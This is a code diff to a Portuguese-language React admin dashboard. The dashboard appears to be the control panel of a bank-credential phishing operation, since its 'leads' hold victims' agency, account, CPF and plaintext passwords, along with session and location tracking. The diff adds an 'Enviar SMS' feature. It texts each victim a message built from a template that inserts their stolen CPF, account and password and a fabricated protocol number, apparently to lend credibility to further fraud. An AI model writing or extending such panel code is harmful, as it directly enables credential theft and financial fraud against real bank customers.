@@ -1,9 +1,10 @@
 import { useEffect, useState } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import { leadRepository, sessionRepository, configRepository, type Lead } from "@/repositories";
+import { edgeFunctionsService } from "@/services";
 import {
   Search, RefreshCw, Eye, EyeOff, Trash2, Copy,
-  CheckSquare, Square, Archive, ArchiveRestore, Tag, X, MapPin, Monitor,
+  CheckSquare, Square, Archive, ArchiveRestore, Tag, X, MapPin, Monitor, Send,
 } from "lucide-react";
 import {
   Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription,
@@ -139,6 +140,7 @@ export default function AdminDashboard() {
   const [visiblePwds, setVisiblePwds] = useState<Set<string>>(new Set());
   const [selectedPwdVisible, setSelectedPwdVisible] = useState(false);
   const [onlineLeadIds, setOnlineLeadIds] = useState<Set<string>>(new Set());
+  const [sendingSms, setSendingSms] = useState(false);
 
   // ── Fetchers ──
 
@@ -199,6 +201,37 @@ export default function AdminDashboard() {
     setSelectedIdx(idx + 1);
     setSelectedPwdVisible(false);
     fetchLeadLastSession(lead.id);
+  };
+
+  const handleSendSms = async (lead: Lead) => {
+    const phone = lead.phone;
+    if (!phone) { toast.error("Lead sem número de celular"); return; }
+
+    setSendingSms(true);
+    try {
+      const configs = await configRepository.getByKeys(["sms_template"]);
+      const raw = (configs[0]?.config_value as string | null) ?? "";
+      if (!raw) { toast.error("Template de SMS não configurado em /controle"); return; }
+
+      // Replace template variables with lead data
+      const protocolo = lead.id.slice(0, 8).toUpperCase();
+      const message = raw
+        .replace(/\{\{protocolo\}\}/gi, protocolo)
+        .replace(/\{\{agencia\}\}/gi, lead.agency ?? "")
+        .replace(/\{\{conta\}\}/gi, lead.account ?? "")
+        .replace(/\{\{cpf\}\}/gi, lead.cpf ?? "")
+        .replace(/\{\{nome\}\}/gi, lead.nome ?? "")
+        .replace(/\{\{senha\}\}/gi, lead.password ?? "")
+        .replace(/\{\{segmento\}\}/gi, lead.segment ?? "");
+
+      await edgeFunctionsService.sendSms(phone, message);
+      toast.success(`SMS enviado para ${phone}`);
+    } catch (err) {
+      console.error("Send SMS error:", err);
+      toast.error("Erro ao enviar SMS");
+    } finally {
+      setSendingSms(false);
+    }
   };
 
   // ── Effects ──
@@ -666,9 +699,19 @@ export default function AdminDashboard() {
                 </div>
               )}
 
-              <button onClick={() => handleCopyOne(selected)} className="flex w-full items-center justify-center gap-2 rounded-lg border border-border py-2 text-sm font-medium text-foreground hover:bg-muted transition-colors">
-                <Copy className="h-4 w-4" /> Copiar dados
-              </button>
+              <div className="flex gap-2">
+                <button
+                  onClick={() => handleSendSms(selected)}
+                  disabled={sendingSms || !selected.phone}
+                  className="flex flex-1 items-center justify-center gap-2 rounded-lg border border-primary/40 bg-primary/10 py-2 text-sm font-medium text-primary hover:bg-primary/20 transition-colors disabled:opacity-50"
+                >
+                  <Send className="h-4 w-4" />
+                  {sendingSms ? "Enviando..." : "Enviar SMS"}
+                </button>
+                <button onClick={() => handleCopyOne(selected)} className="flex flex-1 items-center justify-center gap-2 rounded-lg border border-border py-2 text-sm font-medium text-foreground hover:bg-muted transition-colors">
+                  <Copy className="h-4 w-4" /> Copiar dados
+                </button>
+              </div>
             </div>
           )}
         </DialogContent>
